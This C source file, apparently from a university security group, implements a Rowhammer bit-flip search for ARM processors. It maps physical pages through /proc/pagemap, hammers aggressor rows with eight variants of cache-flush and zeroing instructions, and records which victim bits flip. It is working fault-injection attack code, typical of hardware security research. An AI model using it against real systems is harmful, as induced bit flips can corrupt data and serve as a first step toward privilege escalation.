/*******************************************************************************
* find_vulnerable -- find bits that are easy to be flipped
* By VandySec Group
*******************************************************************************/
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h> 
#include <pagemap.h>
#include <linux/perf_event.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>

#define PAGE_SIZE     4096
#define VAL_SIZE      sizeof(unsigned long)
/*******************************************************************************
* Parameters:
*   CHUNK_SIZE  :Size of the memory chunk where we implement rowhammer attacks
*   VPN_SIZE    :Size of the array used to store virtual page number
*   TIMES       :Number of aggressor pairs to be hammered
*   HAMMER_ROUND:Number of iterataions to repeatedly access the aggressor rows
*   USE_INPUT   :Obtain aggressor rows from input(1)/ using find_candidate()(0)
*   INPUT_FILE  :If input file is used, specify the path to the input file
*   OUT_INTERVAL:The interval to display results
*   INIT_BIT    :Initialize victim rows with 0/1 to find 0_to_1/1_to_0 bit flip
*******************************************************************************/
#define CHUNK_SIZE    0x40000000
#define VPN_SIZE      0x80000
#define TIMES         150000 
#define HAMMER_ROUND  2500000
#define USE_INPUT     0      
#define INPUT_FILE    "input/input0" 
#define OUT_INTERVAL  100    
#define INIT_BIT      1      

// structure used to store possible aggressor pairs
struct attkr_t{
  unsigned long pa1;
  unsigned long pa2;
  unsigned long va1;
  unsigned long va2;
  unsigned long vctm_base;
  unsigned long init_val;
  struct attkr_t *next;
};

// large chunk to search for vulnerable bits
unsigned long chunk[CHUNK_SIZE / VAL_SIZE];
// virtual_to_physical mappint
unsigned long va_tab[VPN_SIZE];
// counter for the number of bit flips
unsigned cnt = 0;

// function to generate physical to virtual address mapping
void
generate_va_table(int pgmp)
{
  for (int i = 0; i < CHUNK_SIZE / VAL_SIZE; i += PAGE_SIZE / VAL_SIZE){
    unsigned long data;
    unsigned long index = (unsigned long)&chunk[i] / PAGE_SIZE * sizeof(data);
    // read data in pagemap file
    if (pread(pgmp, &data, sizeof(data), index) != sizeof(data)) {
      perror("pread");
      break;
    }
    // store the virtual page number 
    unsigned long pfn = data & 0x7fffffffffffff;
    if (pfn <= 0 || pfn > VPN_SIZE){
      perror("VPN_TABLE TOO SMALL");
      break;
    }
    else
      va_tab[pfn] = index / sizeof(data) * PAGE_SIZE; 
  }
}

// function convert physical address to virtual address
unsigned long *
pa_to_va(unsigned long pa)
{
  unsigned long va_off = pa % PAGE_SIZE;
  unsigned long va_pfn = pa / PAGE_SIZE;
  if (va_tab[va_pfn] == 0)
    return 0;
  else
    return (unsigned long *)(va_tab[va_pfn] + va_off);
}

// generate a list of aggressor rows based on the input file
struct attkr_t *
generate_addr_list(char *fname)
{
  FILE *f_in = fopen(fname, "r");
  char str[999];
  unsigned long attk_pa1, attk_pa2, attk_pfn1, attk_pfn2, init_val;
  struct attkr_t *head, *curr, *prev;
  head = NULL;
  curr = head;
  while (fscanf(f_in, "%s", str) != EOF){
    attk_pa1 = (unsigned long)strtol(str, NULL, 16);
    fscanf(f_in, "%s", str);
    attk_pa2 = (unsigned long)strtol(str, NULL, 16);
    fscanf(f_in, "%s", str);
    init_val = (unsigned long)(-strtol(str, NULL, 10));
    attk_pfn1 = attk_pa1 / PAGE_SIZE;
    attk_pfn2 = attk_pa2 / PAGE_SIZE;
    curr = (struct attkr_t *)malloc(sizeof(struct attkr_t));
    curr->pa1 = attk_pa1;
    curr->pa2 = attk_pa2;
    curr->va1 = (unsigned long)pa_to_va(attk_pa1);
    curr->va2 = (unsigned long)pa_to_va(attk_pa2);
    curr->vctm_base = (attk_pfn1 + attk_pfn2) / 2 * PAGE_SIZE;
    curr->init_val = init_val;
    curr->next = NULL;

    if (curr->va1 == 0 || curr->va2 == 0){
      free(curr);
      continue;
    }
    else if (head == NULL){
      head = curr;
      prev = head;
    }
    else {
      prev->next = curr;
      prev = prev->next;
    }
  }
  fclose(f_in);
  return head;
}

int
main(int argc, char **argv)
{
  unsigned i, j;
  unsigned long addr1, addr2;
  unsigned long temp = -INIT_BIT;
  printf(
    "Select rowhammer approach\n"
    "1.DC CVAC  + STR(default)\n"
    "2.DC CIVAC + STR\n"
    "3.DC CIVAC + LDR\n"
    "4.DC ZVA\n"
    "5.DC CVAC  + STR + DSB\n"
    "6.DC CIVAC + STR + DSB\n"
    "7.DC CIVAC + LDR + DSB\n"
    "8.DC ZVA + DSB\n"
  );
  int mode = getchar() - '0';
  mode = mode > 0 && mode <= 8 ? mode : 1;
  printf("mode %d is selected\n", mode);
 
#if INIT_BIT
  FILE *fp = fopen("results_1_to_0", "w");
#else
  FILE *fp = fopen("results_0_to_1", "w");
#endif

  char path[200];
  sprintf(path, "/proc/%u/pagemap", getpid());
  int pgmp = open(path, O_RDONLY);
  // initialize chunk
  for (i = 0; i < CHUNK_SIZE / VAL_SIZE; ++i)
    chunk[i] = -INIT_BIT;
  // generate pa-va mapping
  generate_va_table(pgmp);

  // addresses of attacker rows and victim rows 
  unsigned long attk_pa1, attk_pa2, attk_pfn1, attk_pfn2;
  unsigned long vctm_pa, vctm_off, vctm_pfn, *vctm_va;


#if USE_INPUT
  struct attkr_t *head, *curr;
  head = generate_addr_list(INPUT_FILE);
#else
  candidate_t *head, *curr;
  unsigned long bgn, end;
  bgn = (unsigned long) chunk;
  end = bgn + CHUNK_SIZE;
  // hammer all possible attaker rows found
  head = find_candidates(bgn, end, 12, 16);
#endif

  for (i = 0, curr = head; i < TIMES && curr != NULL; ++i, curr = curr->next) {
    // get physical and virtual address for attacker rows
    attk_pa1 = curr->pa1;
    attk_pa2 = curr->pa2;
    attk_pfn1 = attk_pa1 / PAGE_SIZE;
    attk_pfn2 = attk_pa2 / PAGE_SIZE;
    addr1 = curr->va1;
    addr2 = curr->va2;


    switch (mode)
    {
      case 1:
        // hammer using DC CVAC + STR without DSB
        for (j = 0; j < HAMMER_ROUND; ++j) {
          asm volatile(
            "str %2, [%0]\n\t"
            "str %2, [%1]\n\t"
            "dc cvac, %0\n\t"
            "dc cvac, %1\n\t"
            //"dsb 0xb"
            ::"r" (addr1), "r" (addr2), "r" (temp)
          );
        }
        break;
      case 2:
        // hammer using DC CIVAC + STR without DSB
        for (j = 0; j < HAMMER_ROUND; ++j) {
          asm volatile(
            "str %2, [%0]\n\t"
            "str %2, [%1]\n\t"
            "dc civac, %0\n\t"
            "dc civac, %1\n\t"
            //"dsb 0xb"
            ::"r" (addr1), "r" (addr2), "r" (temp)
          );
        }
        break;
      case 3:
        // hammer using DC CIVAC + LDR without DSB
        for (j = 0; j < HAMMER_ROUND; ++j) {
          asm volatile(
            "ldr %2, [%0]\n\t"
            "ldr %2, [%1]\n\t"
            "dc civac, %0\n\t"
            "dc civac, %1\n\t"
            //"dsb 0xb"
            ::"r" (addr1), "r" (addr2), "r" (temp)
          );
        }
        break;
      case 4:
        // hammer using DC ZVA without DSB
        asm volatile(
          "dc civac, %0\n\t"
          "dc civac, %1\n\t"
          ::"r" (addr1), "r" (addr2)
        );
        for (j = 0; j < HAMMER_ROUND; ++j) {
          asm volatile(
            "dc zva, %0\n\t"
            "dc zva, %1\n\t"
            //"dsb 0xb"
            ::"r" (addr1), "r" (addr2)
          );
        }
        break;
      case 5:
        // hammer using DC CVAC + STR with DSB
        for (j = 0; j < HAMMER_ROUND; ++j) {
          asm volatile(
            "str %2, [%0]\n\t"
            "str %2, [%1]\n\t"
            "dc cvac, %0\n\t"
            "dc cvac, %1\n\t"
            "dsb 0xb"
            ::"r" (addr1), "r" (addr2), "r" (temp)
          );
        }
        break;
      case 6:
        // hammer using DC CIVAC + STR with DSB
        for (j = 0; j < HAMMER_ROUND; ++j) {
          asm volatile(
            "str %2, [%0]\n\t"
            "str %2, [%1]\n\t"
            "dc civac, %0\n\t"
            "dc civac, %1\n\t"
            "dsb 0xb"
            ::"r" (addr1), "r" (addr2), "r" (temp)
          );
        }
        break;
      case 7:
        // hammer using DC CIVAC + LDR with DSB
        for (j = 0; j < HAMMER_ROUND; ++j) {
          asm volatile(
            "ldr %2, [%0]\n\t"
            "ldr %2, [%1]\n\t"
            "dc civac, %0\n\t"
            "dc civac, %1\n\t"
            "dsb 0xb"
            ::"r" (addr1), "r" (addr2), "r" (temp)
          );
        }
        break;
      case 8:
        // hammer using DC ZVA with DSB
        asm volatile(
          "dc civac, %0\n\t"
          "dc civac, %1\n\t"
          ::"r" (addr1), "r" (addr2)
        );
        for (j = 0; j < HAMMER_ROUND; ++j) {
          asm volatile(
            "dc zva, %0\n\t"
            "dc zva, %1\n\t"
            "dsb 0xb"
            ::"r" (addr1), "r" (addr2)
          );
        }
        break;
    }

    // check victim row for bit flips
    for (j = 0; j < (1 << 15); j += VAL_SIZE) {
      vctm_pa = (attk_pfn1 + attk_pfn2) / 2 * PAGE_SIZE + j;
      vctm_off = vctm_pa % PAGE_SIZE;
      vctm_pfn = vctm_pa / PAGE_SIZE;
      // if victim row is not present
      if (va_tab[vctm_pfn] == 0)
        continue;
      // get virtual address of victim address
      vctm_va = (unsigned long *)(va_tab[vctm_pfn] + vctm_off);
      unsigned long val = *vctm_va;
      // output results if any bit flips occur
      if (val != -INIT_BIT) {
        cnt++;
        printf("attacker1:%lx\tattacker2:%lx\n", attk_pa1, attk_pa2);
        printf("cnt:%u victim:%lx becomes %lx\n", cnt, vctm_pa, val);
        fprintf(fp,"%8lx %8lx\t%u\n", attk_pa1, attk_pa2, INIT_BIT);
      }
      // reset values in victim rows
      *vctm_va = -INIT_BIT;
    }
    // display result every OUT_INTERVAL rounds
    if (i % OUT_INTERVAL == 0 )
      printf("round:%u\tcount:%u\n\n", i, cnt);
  }
  fclose(fp);
  close(pgmp);
}

